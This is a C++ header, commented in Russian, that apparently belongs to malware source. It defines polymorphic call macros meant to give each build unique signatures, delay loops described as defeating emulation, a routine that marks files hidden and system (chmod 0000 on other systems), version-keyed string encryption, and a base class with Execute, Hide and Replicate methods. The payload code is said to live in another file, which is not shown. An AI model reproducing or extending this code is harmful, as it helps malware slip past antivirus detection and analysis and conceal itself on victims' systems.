#pragma once

// Полиморфные макросы для обфускации вызовов функций
// Каждая компиляция генерирует уникальные сигнатуры
// Генератор случайных функций на этапе препроцессора
#define POLYMORPHIC_CALL(func, ...) \
    PolyDispatcher::Call<decltype(&func)>(&func, POLY_VERSION, ##__VA_ARGS__)

#define POLYMORPHIC_SPAWN_THREAD(func, param) \
    PolyDispatcher::SpawnThread(&func, param, POLY_OFFSET_1)

#define POLYMORPHIC_HIDE(path) \
    PolyDispatcher::Hide(path, POLY_OFFSET_2)

// КЛАСС-ДИСПЕТЧЕР ДЛЯ ПОЛИМОРФНЫХ ВЫЗОВОВ

class PolyDispatcher {
public:
    // Универсальный вызов функции с переменным числом аргументов
    template<typename FuncPtr, typename... Args>
    static auto Call(FuncPtr func, unsigned int version, Args... args) {
        // Добавляем случайную задержку для избежания эмуляции
        volatile int dummy = (version ^ POLY_RANDOM_SEED) & 0xFF;
        for (int i = 0; i < (dummy % 10); i++) {
            dummy ^= (i << (version % 7));
        }
        
        return func(args...);
    }
    
#ifdef _WIN32
    template<typename FuncPtr>
    static HANDLE SpawnThread(FuncPtr func, LPVOID param, unsigned int offset) {
        // Случайный размер стека в зависимости от смещения
        SIZE_T stack_size = (1024 * ((offset & 0xFF) + 1));
        
        return CreateThread(NULL, stack_size, (LPTHREAD_START_ROUTINE)func, param, 0, NULL);
    }
#else
    template<typename FuncPtr>
    static int SpawnThread(FuncPtr func, void* param, unsigned int offset) {
        pthread_t tid;
        return pthread_create(&tid, NULL, (void*(*)(void*))func, param);
    }
#endif
    
    static void Hide(const char* path, unsigned int offset) {
        // Динамическое шифрование пути в зависимости от оффсета
        std::string key = "TS_KEY_";
        key += std::to_string(offset % 2024);
        
        std::string encPath = Security::EncryptString(path, key);
        std::string decPath = Security::DecryptString(encPath, key);
        
#ifdef _WIN32
        SetFileAttributesA(decPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
#else
        chmod(decPath.c_str(), 0000);
#endif
    }
};

// ПОЛИМОРФНЫЕ МАКРОСЫ БЕЗ ПРЯМЫХ ВЫЗОВОВ
// Просто выбирают вариант в зависимости от версии
// Конкретные функции реализованы в main.cpp

#define CALL_POLYMORPHIC_INIT() do { \
    volatile int variant = (POLY_VERSION % 3); \
    (void)variant; /*避免警告 */ \
} while(0)

#define CALL_POLYMORPHIC_HIDE(path) do { \
    volatile int variant = ((POLY_VERSION >> 8) % 3); \
    (void)variant; \
} while(0)

// ОБФУСКАЦИЯ СТРОК

class PolyString {
public:
    static std::string Encrypt(const std::string& str) {
        // Шифруем с динамическим ключом, зависящим от версии
        std::string key = "POLY_" + std::to_string(POLY_VERSION);
        return Security::EncryptString(str, key);
    }
    
    static std::string Decrypt(const std::string& encrypted) {
        std::string key = "POLY_" + std::to_string(POLY_VERSION);
        return Security::DecryptString(encrypted, key);
    }
};

// ВИРТУАЛЬНЫЕ ФУНКЦИИ С ПОЛИМОРФИЗМОМ

class PolymorphicBase {
protected:
    virtual void Execute() = 0;
    virtual void Hide() = 0;
    virtual void Replicate() = 0;
    
    // Уникальный ID для каждой версии
    static const unsigned int UUID = POLY_OFFSET_3;
};

// Полиморфный вспомогательный класс
class PolymorphicHelper {
public:
    static unsigned int GetVariant() {
        return POLY_VERSION % 256;
    }
    
    static unsigned int GetVariant4() {
        return POLY_VERSION % 4;
    }
    
    static unsigned int GetVariant2() {
        return POLY_VERSION % 2;
    }
    
    static unsigned int GetVariant6() {
        return POLY_VERSION % 6;
    }
};
